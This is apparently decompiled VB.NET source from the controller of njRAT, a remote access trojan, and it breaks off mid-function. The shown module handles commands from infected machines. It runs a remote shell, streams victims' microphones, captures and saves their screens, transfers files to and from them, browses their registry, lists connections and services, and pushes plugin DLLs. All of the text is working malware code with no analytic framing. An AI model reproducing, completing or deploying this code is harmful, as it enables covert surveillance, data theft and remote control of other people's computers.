Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net.NetworkInformation
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My
Imports NJRAT.My.Resources
Imports NJRAT.njRAT
Imports WinMM

Namespace NJRAT
	' Token: 0x02000029 RID: 41
	Friend NotInheritable Module Class7
		' Token: 0x06000572 RID: 1394 RVA: 0x0013AFA0 File Offset: 0x001393A0
		<DebuggerNonUserCode()>
		Public Sub New()
		End Sub

		' Token: 0x06000574 RID: 1396 RVA: 0x0013B07C File Offset: 0x0013947C
		Public Function smethod_0(string_2 As String, string_3 As String) As Class7.Class9
			Dim flag As Boolean = string_2 <> Nothing
			If flag Then
				Try
					For Each [class] As Class7.Class9 In Class7.list_1
						flag = (Operators.CompareString([class].string_0, string_2.ToLower(), False) = 0)
						If flag Then
							Return [class]
						End If
					Next
				Finally
					Dim enumerator As List(Of Class7.Class9).Enumerator
					enumerator.Dispose()
				End Try
			End If
			flag = (string_3 <> Nothing)
			If flag Then
				Try
					For Each class2 As Class7.Class9 In Class7.list_1
						flag = (Operators.CompareString(class2.string_1, string_3, False) = 0)
						If flag Then
							Return class2
						End If
					Next
				Finally
					Dim enumerator2 As List(Of Class7.Class9).Enumerator
					enumerator2.Dispose()
				End Try
			End If
			Return Nothing
		End Function

		' Token: 0x06000575 RID: 1397 RVA: 0x0013B168 File Offset: 0x00139568
		Public Function smethod_1(dataGridViewRow_0 As DataGridViewRow) As Object
			Dim result As Object
			Try
				result = RuntimeHelpers.GetObjectValue(If((dataGridViewRow_0 IsNot Nothing), If((dataGridViewRow_0.Tag IsNot Nothing), Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("[", RuntimeHelpers.GetObjectValue(dataGridViewRow_0.Cells(Class7.int_0).Value))), "/")), RuntimeHelpers.GetObjectValue(dataGridViewRow_0.Cells(Class7.int_3).Value))), "/")), RuntimeHelpers.GetObjectValue(dataGridViewRow_0.Cells(Class7.int_7).Value))), "]"), "?"), "?"))
			Catch ex As Exception
				result = "?"
			End Try
			Return result
		End Function

		' Token: 0x06000576 RID: 1398 RVA: 0x0013B270 File Offset: 0x00139670
		Public Function smethod_2(client_0 As Client, class9_0 As Class7.Class9, bool_1 As Boolean) As Boolean
			Try
				Dim text As String
				If bool_1 Then
					text = "ret" + Class7.string_1 + class9_0.string_1 + Class7.string_1
				Else
					text = String.Concat(New String() { "inv", Class7.string_1, class9_0.string_1, Class7.string_1, client_0.ip(), Class7.string_1 })
				End If
				Dim memoryStream As MemoryStream = New MemoryStream()
				memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
				Dim flag As Boolean = Not client_0.plg.Contains(class9_0.string_1)
				If flag Then
					memoryStream.Write(class9_0.byte_0, 0, class9_0.byte_0.Length)
				Else
					memoryStream.WriteByte(40)
				End If
				client_0.Send(memoryStream.ToArray())
				Return True
			Catch ex As Exception
			End Try
			Return False
		End Function

		' Token: 0x06000577 RID: 1399 RVA: 0x0013B390 File Offset: 0x00139790
		Public Function smethod_3(string_2 As String) As Form
			Return MyProject.Application.OpenForms(string_2)
		End Function

		' Token: 0x06000578 RID: 1400 RVA: 0x0013B3B4 File Offset: 0x001397B4
		Public Sub smethod_4(object_0 As Object)
			Dim enumerator As IEnumerator = Class7.form1_0.L1.SelectedRows.GetEnumerator()
			enumerator.Reset()
			Dim flag As Boolean = TypeOf NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { RuntimeHelpers.GetObjectValue(0) }, Nothing)Is String
			Dim b As Byte()
			If flag Then
				Dim text As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { RuntimeHelpers.GetObjectValue(0) }, Nothing)))
				Dim array As Byte() = Class6.smethod_11(text)
				NewLateBinding.LateIndexSetComplex(RuntimeHelpers.GetObjectValue(object_0), New Object() { RuntimeHelpers.GetObjectValue(0), text }, Nothing, True, False)
				b = array
			Else
				b = CType(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { RuntimeHelpers.GetObjectValue(0) }, Nothing), Byte())
			End If
			While enumerator.MoveNext()
				Dim obj As Object = enumerator.Current
				Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
				CType(dataGridViewRow.Tag, Client).Send(b)
				Dim defaultCellStyle As DataGridViewCellStyle = dataGridViewRow.DefaultCellStyle
				Dim objectValue As Object = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { RuntimeHelpers.GetObjectValue(1) }, Nothing))
				Dim color As Color
				If objectValue Is Nothing Then
					Dim color2 As Color
					color = color2
				Else
					Dim obj2 As Object = objectValue
					Dim color3 As Color
					color = If((obj2 IsNot Nothing), CType(obj2, Color), color3)
				End If
				Dim foreColor As Color = color
				defaultCellStyle.ForeColor = foreColor
			End While
		End Sub

		' Token: 0x06000579 RID: 1401 RVA: 0x0013B540 File Offset: 0x00139940
		Public Sub smethod_5(object_0 As Object)
			Dim client As Client = CType(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { RuntimeHelpers.GetObjectValue(0) }, Nothing), Client)
			Dim array As Byte() = CType(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { RuntimeHelpers.GetObjectValue(1) }, Nothing), Byte())
			Dim array2 As String() = Strings.Split(Class6.smethod_12(array), Class7.string_1, -1, CompareMethod.Binary)
			Try
				Dim left As String = array2(0)
				Dim flag As Boolean = Operators.CompareString(left, "Ex", False) = 0
				If flag Then
					Dim manager As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
					flag = (manager Is Nothing)
					If Not flag Then
						manager.SL.Text = array2(1)
						flag = Not array2(1).StartsWith("rs:!-->")
						If Not flag Then
							manager.shStarted = 0
						End If
					End If
				Else
					flag = (Operators.CompareString(left, "srv", False) = 0)
					If flag Then
						Dim manager2 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
						flag = (manager2 Is Nothing OrElse Operators.CompareString(array2(1), "~", False) <> 0)
						If Not flag Then
							Dim list As List(Of String) = New List(Of String)()
							Dim list2 As List(Of ListViewItem) = New List(Of ListViewItem)()
							Dim num As Integer = 2
							Dim num2 As Integer = array2.Length - 1
							For i As Integer = num To num2
								Dim array3 As String() = Strings.Split(array2(i), "[,]", -1, CompareMethod.Binary)
								list.Add(array3(0).ToLower())
								flag = manager2.LSRV.Items.ContainsKey(array3(0))
								If flag Then
									Dim listViewItem As ListViewItem = manager2.LSRV.Items(array3(0))
									listViewItem.SubItems(3).Text = array3(3)
									listViewItem.SubItems(4).Text = array3(4)
								Else
									Dim listViewItem2 As ListViewItem = New ListViewItem(array3(0))
									Dim num3 As Integer = 1
									Dim num4 As Integer = array3.Length - 1
									For j As Integer = num3 To num4
										listViewItem2.SubItems.Add(array3(j))
									Next
									listViewItem2.Name = array3(0)
									list2.Add(listViewItem2)
									flag = (list2.Count > 20)
									If flag Then
										manager2.LSRV.Items.AddRange(list2.ToArray())
										list2.Clear()
									End If
								End If
							Next
							flag = (list2.Count > 0)
							If flag Then
								manager2.LSRV.Items.AddRange(list2.ToArray())
								list2.Clear()
							End If
							Dim list3 As List(Of String) = New List(Of String)()
							Try
								Try
									For Each obj As Object In manager2.LSRV.Items
										Dim listViewItem3 As ListViewItem = CType(obj, ListViewItem)
										flag = Not list.Contains(listViewItem3.Text.ToLower())
										If flag Then
											list3.Add(listViewItem3.Text)
										End If
									Next
								Finally
									Dim enumerator As IEnumerator
									flag = (TypeOf enumerator Is IDisposable)
									If flag Then
										TryCast(enumerator, IDisposable).Dispose()
									End If
								End Try
							Finally
								Dim enumerator2 As IEnumerator
								flag = (TypeOf enumerator2 Is IDisposable)
								If flag Then
									TryCast(enumerator2, IDisposable).Dispose()
								End If
							End Try
							Try
								For Each key As String In list3
									manager2.LSRV.Items.RemoveByKey(key)
								Next
							Finally
								Dim enumerator3 As List(Of String).Enumerator
								enumerator3.Dispose()
							End Try
							manager2.srvNxt = True
							flag = Not manager2.SrvFX
							If Not flag Then
								manager2.SrvFX = False
								manager2.LSRV.method_3()
							End If
						End If
					Else
						flag = (Operators.CompareString(left, "tcp", False) = 0)
						If flag Then
							Dim manager3 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
							flag = (manager3 Is Nothing)
							If Not flag Then
								Dim pr As ToolStripProgressBar = manager3.pr
								SyncLock pr
									Dim left2 As String = array2(1)
									flag = (Operators.CompareString(left2, "~", False) = 0)
									If flag Then
										Dim array4 As String() = Strings.Split(array2(2), "*", -1, CompareMethod.Binary)
										manager3.pr.Value = 0
										manager3.pr.Maximum = array4.Length
										Dim list4 As List(Of ListViewItem) = New List(Of ListViewItem)()
										Dim num5 As Integer = 0
										Dim num6 As Integer = array4.Length - 1
										For k As Integer = num5 To num6
											Dim array5 As String() = Strings.Split(array4(k), ",", -1, CompareMethod.Binary)
											flag = manager3.LTCP.Items.ContainsKey(array5(0) + array5(1))
											If flag Then
												Dim listViewItem4 As ListViewItem = manager3.LTCP.Items(array5(0) + array5(1))
												listViewItem4.SubItems(4).Text = CType(Conversions.ToInteger(array5(2)), TcpState).ToString()
												Dim foreColor As Color = listViewItem4.ForeColor
												Select Case Conversions.ToInteger(array5(2))
													Case 1, 8, 9, 11, 12
														listViewItem4.ForeColor = Color.Red
													Case 4
														listViewItem4.ForeColor = Color.YellowGreen
													Case 5
														listViewItem4.ForeColor = Color.LimeGreen
												End Select
											Else
												Dim listViewItem5 As ListViewItem = New ListViewItem(array5(0).Split(New Char() { ":"c })(0))
												listViewItem5.Name = array5(0) + array5(1)
												listViewItem5.Tag = array5(0) + array5(1)
												listViewItem5.SubItems.Add(array5(0).Split(New Char() { ":"c })(1))
												listViewItem5.SubItems.Add(array5(1).Split(New Char() { ":"c })(0))
												listViewItem5.SubItems.Add(array5(1).Split(New Char() { ":"c })(1))
												listViewItem5.SubItems.Add(CType(Conversions.ToInteger(array5(2)), TcpState).ToString())
												listViewItem5.SubItems.Add(array5(3))
												Select Case Conversions.ToInteger(array5(2))
													Case 1, 8, 9, 11, 12
														listViewItem5.ForeColor = Color.Red
													Case 3, 4
														listViewItem5.ForeColor = Color.YellowGreen
													Case 5
														listViewItem5.ForeColor = Color.LimeGreen
												End Select
												list4.Add(listViewItem5)
												flag = (list4.Count > 20)
												If flag Then
													manager3.LTCP.Items.AddRange(list4.ToArray())
													list4.Clear()
													Dim columnHeader_ As ColumnHeader = manager3.LTCP.columnHeader_0
													flag = (columnHeader_ Is Nothing)
													If flag Then
														manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, New ColumnClickEventArgs(0))
													Else
														columnHeader_.Tag = RuntimeHelpers.GetObjectValue(If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_.Tag), "+", False)), If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_.Tag), "-", False)), "-", "+"), "-"))
														manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, New ColumnClickEventArgs(columnHeader_.Index))
													End If
												End If
											End If
										Next
										flag = manager3.TCPFX
										If flag Then
											manager3.LTCP.method_3()
											manager3.TCPFX = False
										End If
										flag = (list4.Count > 0)
										If flag Then
											manager3.LTCP.Items.AddRange(list4.ToArray())
											list4.Clear()
											Dim columnHeader_2 As ColumnHeader = manager3.LTCP.columnHeader_0
											flag = (columnHeader_2 Is Nothing)
											If flag Then
												manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, New ColumnClickEventArgs(0))
											Else
												columnHeader_2.Tag = RuntimeHelpers.GetObjectValue(If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_2.Tag), "+", False)), If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_2.Tag), "-", False)), "-", "+"), "-"))
												manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, New ColumnClickEventArgs(columnHeader_2.Index))
											End If
										End If
										manager3.TCPNXT = True
									Else
										flag = (Operators.CompareString(left2, "RM", False) = 0)
										If flag Then
											Dim num7 As Integer = 2
											Dim num8 As Integer = array2.Length - 1
											For l As Integer = num7 To num8
												manager3.LTCP.Items.RemoveByKey(array2(l))
											Next
										Else
											flag = (Operators.CompareString(left2, "ER", False) <> 0)
											If Not flag Then
												manager3.SL.Text = array2(2)
											End If
										End If
									End If
								End SyncLock
							End If
						Else
							flag = (Operators.CompareString(left, "MIC", False) = 0)
							If flag Then
								Dim flag2 As Boolean = client.osk Is Nothing
								If flag2 Then
									client.isPL = True
									Try
										client.osk = Class7.sk_0.GetClient(array2(1))
									Catch ex As Exception
										client.CN = False
									End Try
								End If
								flag2 = Class7.form1_0.InvokeRequired
								If flag2 Then
									Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
								Else
									Dim mic As Mic = CType(Class7.smethod_3("mic" + client.ip()), Mic)
									Dim left3 As String = array2(2)
									flag2 = (Operators.CompareString(left3, "~", False) = 0)
									If flag2 Then
										flag = (mic IsNot Nothing)
										If Not flag Then
											Dim mic2 As Mic = New Mic()
											mic2.Name = "mic" + client.ip()
											mic2.sk = client
											mic2.osk = client.osk
											Dim num9 As Integer = 3
											Dim num10 As Integer = array2.Length - 1
											For m As Integer = num9 To num10
												mic2.ComboBox1.Items.Add(array2(m))
											Next
											mic2.Show()
										End If
									Else
										flag2 = (Operators.CompareString(left3, "!", False) = 0)
										If flag2 Then
											flag = (mic Is Nothing)
											If flag Then
												client.CN = False
											Else
												Dim array6 As Byte() = CType(NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2(3) + Class7.string_1), New Object() { RuntimeHelpers.GetObjectValue(1) }, Nothing), Byte())
												flag2 = (array6(0) = 31)
												If flag2 Then
													Dim byte_ As Byte() = array6
													Dim flag3 As Boolean = False
													Dim flag4 As Boolean = flag3
													array6 = Class6.smethod_8(byte_, flag4)
												End If
												mic.Text = Class6.smethod_17(CLng(array6.Length)) + " " + mic.QQ
												flag2 = (Conversions.ToInteger(array2(3)) = 0)
												If flag2 Then
													Class7.waveOut_0.Write(array6)
												Else
													Class7.waveOut_1.Write(array6)
												End If
											End If
										Else
											flag2 = (Operators.CompareString(left3, "ER", False) <> 0)
											If Not flag2 Then
												flag2 = (mic Is Nothing)
												If flag2 Then
													client.CN = False
												Else
													mic.ComboBox1.Enabled = True
													mic.ComboBox2.Enabled = True
													mic.Button1.Text = "Start"
												End If
											End If
										End If
									End If
								End If
							Else
								Dim flag2 As Boolean = Operators.CompareString(left, "get", False) = 0
								If flag2 Then
									client.isPL = True
									client.t.Dispose()
									client.CN = False
									client.NoPing = True
									Dim up As up = CType(Class7.smethod_3(array2(1) + array2(2)), up)
									flag2 = (up Is Nothing)
									If flag2 Then
										client.Close()
									Else
										up.sk = client
										Dim num11 As Integer = 0
										client.Client.SendBufferSize = 524288
										Try
											While num11 <> up.SZ
												flag2 = Not up.Closinge
												If Not flag2 Then
													GoTo IL_F4F
												End If
												Dim array7 As Byte() = New Byte(10240) {}
												Dim num12 As Integer = up.FS.Read(array7, 0, array7.Length)
												client.Client.Client.Poll(-1, SelectMode.SelectWrite)
												client.Client.Client.Send(array7, 0, num12, SocketFlags.None)
												num11 += num12
												Class7.long_0 += CLng(num12)
												Dim progressBar As ProgressBar = up.ProgressBar1
												progressBar.Value += num12
											End While
											up.Close()
										Catch ex2 As Exception
											Try
												up.Text = "Connection lost"
												up.Lv1.ForeColor = Color.Red
											Catch ex3 As Exception
											End Try
										End Try
										IL_F4F:
										client.Close()
									End If
								Else
									flag2 = (Operators.CompareString(left, "post+", False) = 0)
									If flag2 Then
										client.isPL = True
										Dim dw As DW = New DW()
										dw.FN = array2(1)
										dw.SZ = Conversions.ToInteger(array2(2))
										dw.c = client
										dw.osk = client.osk
										dw.Name = dw.osk.ip() + array2(1)
										dw.Show()
									Else
										flag2 = (Operators.CompareString(left, "post", False) = 0)
										If flag2 Then
											client.osk = Class7.sk_0.GetClient(array2(3))
											Try
												client.t.Dispose()
												client.CN = False
												client.NoPing = True
												Dim objectValue As Object = RuntimeHelpers.GetObjectValue(object_0)
												Dim array8 As Object() = New Object() { RuntimeHelpers.GetObjectValue(1), Nothing }
												Dim array9 As Object() = array8
												Dim num13 As Integer = 1
												Dim text As String = String.Concat(New String() { "post+", Class7.string_1, array2(1), Class7.string_1, array2(2), Class7.string_1, array2(3) })
												Dim array10 As Byte() = Class6.smethod_11(text)
												array9(num13) = array10
												Dim arguments As Object() = array8
												Dim obj2 As Object = Nothing
												NewLateBinding.LateIndexSet(RuntimeHelpers.GetObjectValue(objectValue), arguments, CType(obj2, String()))
												Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
												Dim num14 As Integer = 0
												While Class7.smethod_3(array2(3) + array2(1)) Is Nothing
													num14 += 1
													flag2 = (num14 = 1000)
													If flag2 Then
														Return
													End If
													Thread.Sleep(10)
												End While
												Dim client2 As Socket = client.Client.Client
												text = "ok"
												Dim buffer As Byte() = Class6.smethod_11(text)
												Dim offset As Integer = 0
												Dim size As Integer = 2
												Dim socketFlags As Integer = 0
												client2.Send(buffer, offset, size, CType(socketFlags, SocketFlags))
												client.Client.Client.ReceiveBufferSize = 1048576
												Class7.long_0 += 2L
												Dim array11 As Byte() = New Byte(1024) {}
												Dim dw2 As DW = CType(Class7.smethod_3(array2(3) + array2(1)), DW)
												Dim num15 As Integer = 0
												Try
													While True
														Dim array12 As Byte() = New Byte(1048576) {}
														client.Client.Client.Poll(-1, SelectMode.SelectRead)
														Dim num16 As Integer = client.Client.Client.Receive(array12, 0, array12.Length, SocketFlags.None)
														dw2.FS.Write(array12, 0, num16)
														Class7.long_1 += CLng(num16)
														num15 += num16
														Dim progressBar2 As ProgressBar = dw2.ProgressBar1
														progressBar2.Value += num16
														dw2.FS.Flush()
														flag2 = (num15 <> dw2.SZ)
														If Not flag2 Then
															Exit For
														End If
														Thread.Sleep(1)
													End While
													dw2.Button1.Enabled = False
													dw2.FS.Close()
													dw2.FS.Dispose()
													flag2 = File.Exists(dw2.folder)
													If flag2 Then
														File.Delete(dw2.folder)
													End If
													File.Move(dw2.tmp, dw2.folder)
													dw2.Close()
												Catch ex4 As Exception
													dw2.Text = "connection lost"
													dw2.ForeColor = Color.Red
												End Try
											Catch ex5 As Exception
											End Try
											client.Close()
										Else
											flag2 = (Operators.CompareString(left, "RG", False) = 0)
											If flag2 Then
												flag = Class7.form1_0.InvokeRequired
												If flag Then
													Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
												Else
													Dim manager4 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
													Dim pr2 As ToolStripProgressBar = manager4.pr
													SyncLock pr2
														Dim left4 As String = array2(1)
														flag2 = (Operators.CompareString(left4, "ER", False) = 0)
														If flag2 Then
															manager4.RGk.Enabled = True
															manager4.RGLIST.Enabled = True
															manager4.SL.Text = Class6.smethod_16(array2(2))
														Else
															flag2 = (Operators.CompareString(left4, "~", False) <> 0)
															If Not flag2 Then
																manager4.RGk.Enabled = True
																manager4.RGLIST.Enabled = True
																Dim nodes As TreeNodeCollection = manager4.RGk.Nodes
																Dim treeNode As TreeNode = Class6.smethod_7(array2(2), manager4.RGk.Nodes)
																Dim list5 As List(Of String) = New List(Of String)()
																flag2 = (manager4.RGk.SelectedNode Is treeNode)
																If flag2 Then
																	manager4.RGLIST.Items.Clear()
																End If
																flag2 = manager4.RGCH.Contains(array2(2))
																Dim gclass As Manager.GClass13
																If flag2 Then
																	gclass = CType(manager4.RGCH(array2(2)), Manager.GClass13)
																	gclass.list_0.Clear()
																	gclass.list_1.Clear()
																Else
																	gclass = New Manager.GClass13()
																	gclass.string_0 = array2(2)
																	manager4.RGCH.Add(gclass, array2(2), Nothing, Nothing)
																End If
																Dim array13 As String() = Strings.Split(array2(3), "[,]", -1, CompareMethod.Binary)
																manager4.pr.Value = 0
																manager4.pr.Maximum = array13.Length
																For Each text2 As String In array13
																	flag2 = (Operators.CompareString(text2, String.Empty, False) <> 0)
																	If flag2 Then
																		Dim array15 As String() = Strings.Split(text2, "[;]", -1, CompareMethod.Binary)
																		Try
																			Dim pr3 As ToolStripProgressBar = manager4.pr
																			pr3.Value += 1
																			flag2 = (array15.Length > 1)
																			If flag2 Then
																				flag = (manager4.RGk.SelectedNode Is treeNode)
																				If flag Then
																					Dim listViewItem6 As ListViewItem = manager4.RGLIST.Items.Add(array15(0))
																					listViewItem6.SubItems.Add(array15(1))
																					listViewItem6.SubItems.Add(array15(2))
																					listViewItem6.ImageIndex = If((Operators.CompareString(array15(1), "String", False) <> 0), 2, 1)
																				End If
																				gclass.list_0.Add(array15)
																			Else
																				gclass.list_1.Add(array15(0))
																				treeNode.Nodes.Add(array15(0), array15(0))
																				flag2 = Not treeNode.Nodes.ContainsKey(array15(0))
																				If flag2 Then
																					list5.Add(array15(0))
																				End If
																			End If
																		Catch ex6 As Exception
																		End Try
																	End If
																Next
																Try
																	Try
																		For Each obj3 As Object In treeNode.Nodes
																			Dim treeNode2 As TreeNode = CType(obj3, TreeNode)
																			flag2 = list5.Contains(treeNode2.Text)
																			If flag2 Then
																				list5.Remove(treeNode2.Text)
																			End If
																		Next
																	Finally
																		Dim enumerator4 As IEnumerator
																		flag2 = (TypeOf enumerator4 Is IDisposable)
																		If flag2 Then
																			TryCast(enumerator4, IDisposable).Dispose()
																		End If
																	End Try
																Finally
																	Dim enumerator5 As IEnumerator
																	flag2 = (TypeOf enumerator5 Is IDisposable)
																	If flag2 Then
																		TryCast(enumerator5, IDisposable).Dispose()
																	End If
																End Try
																Try
																	For Each key2 As String In list5
																		treeNode.Nodes.RemoveByKey(key2)
																	Next
																Finally
																	Dim enumerator6 As List(Of String).Enumerator
																	enumerator6.Dispose()
																End Try
																flag2 = (treeNode Is manager4.RGk.SelectedNode)
																If flag2 Then
																	treeNode.Expand()
																End If
																manager4.RGLIST.method_3()
																manager4.pr.Value = 0
															End If
														End If
													End SyncLock
												End If
											Else
												flag2 = (Operators.CompareString(left, "rss", False) = 0)
												If flag2 Then
													Dim manager5 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
													flag2 = (manager5 Is Nothing)
													If Not flag2 Then
														manager5.shStarted = 2
														manager5.T2.[ReadOnly] = False
														manager5.T2.BackColor = Color.Black
													End If
												Else
													flag2 = (Operators.CompareString(left, "rs", False) = 0)
													If flag2 Then
														Dim manager6 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
														flag2 = (manager6 Is Nothing)
														If Not flag2 Then
															Dim t As RichTextBox = manager6.T1
															SyncLock t
																manager6.T1.SelectionStart = manager6.T1.TextLength
																manager6.T1.AppendText(Class6.smethod_16(array2(1).Replace(vbCrLf, String.Empty)) + vbCrLf)
																manager6.T1.SelectionStart = manager6.T1.TextLength
																manager6.T1.ScrollToCaret()
															End SyncLock
														End If
													Else
														flag2 = (Operators.CompareString(left, "rsc", False) = 0)
														If flag2 Then
															Dim manager7 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
															flag2 = (manager7 Is Nothing)
															If Not flag2 Then
																manager7.T2.[ReadOnly] = True
																manager7.T2.BackColor = Color.Gray
																manager7.shStarted = 0
															End If
														Else
															flag2 = (Operators.CompareString(left, "PLG", False) = 0)
															If flag2 Then
																Dim [class] As Class7.Class9 = Class7.smethod_0("plg.dll", Nothing)
																Dim memoryStream As MemoryStream = New MemoryStream()
																Dim text3 As String = "PLG" + Class7.string_1
																Dim array16 As Byte() = Class6.smethod_11(text3)
																memoryStream.Write(array16, 0, array16.Length)
																memoryStream.Write([class].byte_0, 0, [class].byte_0.Length)
																client.Send(memoryStream.ToArray())
															Else
																flag2 = (Operators.CompareString(left, "sc~", False) = 0)
																If flag2 Then
																	flag = (client.osk Is Nothing)
																	If flag Then
																		client.isPL = True
																		Try
																			client.osk = Class7.sk_0.GetClient(array2(1))
																		Catch ex7 As Exception
																			client.CN = False
																		End Try
																	End If
																	flag2 = Class7.form1_0.InvokeRequired
																	If flag2 Then
																		Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
																	Else
																		flag2 = (CType(Class7.smethod_3("sc" + client.ip()), sc) IsNot Nothing)
																		If Not flag2 Then
																			Dim sc As sc = New sc()
																			sc.osk = client.osk
																			sc.sz = New Size(Conversions.ToInteger(array2(2)), Conversions.ToInteger(array2(3)))
																			sc.p.Image = Nothing
																			sc.Oimg = New Bitmap(sc.sz.Width, sc.sz.Height, PixelFormat.Format32bppPArgb)
																			sc.sk = client
																			sc.Name = "sc" + client.ip()
																			sc.Show()
																		End If
																	End If
																Else
																	flag2 = (Operators.CompareString(left, "scPK", False) = 0)
																	If flag2 Then
																		Dim sc2 As sc = CType(Class7.smethod_3("sc" + array2(1)), sc)
																		flag2 = (sc2 Is Nothing)
																		If flag2 Then
																			client.CN = False
																		Else
																			Dim obj4 As sc = sc2
																			SyncLock obj4
																				Dim sc3 As sc = sc2
																				sc3.fps += 1
																				sc2.pkt = CLng(array.Length)
																				flag2 = (array2(2).Length = 0)
																				If Not flag2 Then
																					Dim bitmap As Bitmap = CType(Image.FromStream(New MemoryStream(CType(NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2(2) + Class7.string_1), New Object() { RuntimeHelpers.GetObjectValue(1) }, Nothing), Byte()))), Bitmap)
																					flag2 = (bitmap.Width = 0)
																					If Not flag2 Then
																						Dim array17 As String() = Strings.Split(array2(2), "-", -1, CompareMethod.Binary)
																						Dim array18 As String() = Strings.Split(array17(0), ",", -1, CompareMethod.Binary)
																						Dim sz As Size = New Size(Conversions.ToInteger(array18(0)), Conversions.ToInteger(array18(1)))
																						Dim num17 As Integer = Conversions.ToInteger(array17(1))
																						flag2 = (sc2.Oimg.Size <> sz)
																						If flag2 Then
																							sc2.Oimg = New Bitmap(sz.Width, sz.Height, PixelFormat.Format32bppPArgb)
																						End If
																						Dim format As PixelFormat = PixelFormat.Format32bppArgb
																						Dim num18 As Integer = 0
																						Dim num19 As Integer = 2
																						Dim num20 As Integer = array17.Length - 1
																						For num21 As Integer = num19 To num20
																							Dim array19 As String() = Strings.Split(array17(num21), ",", -1, CompareMethod.Binary)
																							Dim rect As Rectangle = New Rectangle(Conversions.ToInteger(array19(0)), Conversions.ToInteger(array19(1)), bitmap.Width, num17)
																							Dim bitmapData As BitmapData = sc2.Oimg.LockBits(rect, ImageLockMode.[WriteOnly], format)
																							Dim bitmap2 As Bitmap = bitmap
																							Dim rect2 As Rectangle = New Rectangle(0, num18, rect.Width, rect.Height)
																							Dim bitmapData2 As BitmapData = bitmap2.LockBits(rect2, ImageLockMode.[ReadOnly], format)
																							Dim array20 As Byte() = New Byte(Math.Abs(bitmapData.Stride) * bitmapData.Height - 1 + 1 - 1 + 1 - 1) {}
																							Class6.memcpy(bitmapData.Scan0, bitmapData2.Scan0, array20.Length)
																							sc2.Oimg.UnlockBits(bitmapData)
																							bitmap.UnlockBits(bitmapData2)
																							num18 += num17
																						Next
																						sc2.p.Image = CType(sc2.Oimg.Clone(), Image)
																						flag2 = Not sc2.CheckBox3.Checked
																						If Not flag2 Then
																							Try
																								sc2.Oimg.Save(sc2.Folder + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg)
																							Catch ex8 As Exception
																							End Try
																						End If
																					End If
																				End If
																			End SyncLock
																		End If
																	Else
																		flag2 = (Operators.CompareString(left, "CH", False) = 0)
																		If flag2 Then
																			flag = (client.osk Is Nothing)
																			If flag Then
																				client.isPL = True
																				Try
																					client.osk = Class7.sk_0.GetClient(array2(1))
																				Catch ex9 As Exception
																					client.CN = False
																				End Try
																			End If
																			flag2 = Class7.form1_0.InvokeRequired
																			If flag2 Then
																				Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
																			Else
																				Dim chat As Chat = CType(Class7.smethod_3("ch" + client.ip()), Chat)
																				Dim left5 As String = array2(2)
																				flag2 = (Operators.CompareString(left5, "~", False) = 0)
																				If flag2 Then
																					flag = (chat IsNot Nothing)
																					If Not flag Then
																						New Chat() With { .Name = "ch" + client.ip(), .sk = client, .osk = client.osk, .T2 = { .Enabled = False }, .Button1 = { .Enabled = False } }.Show()
																					End If
																				Else
																					flag2 = (Operators.CompareString(left5, "!", False) = 0)
																					If flag2 Then
																						chat.T2.Enabled = True
																						chat.Button1.Enabled = True
																						Dim obj5 As Chat = chat
																						SyncLock obj5
																							chat.T1.AppendText("Connected .." & vbCrLf)
																						End SyncLock
																					Else
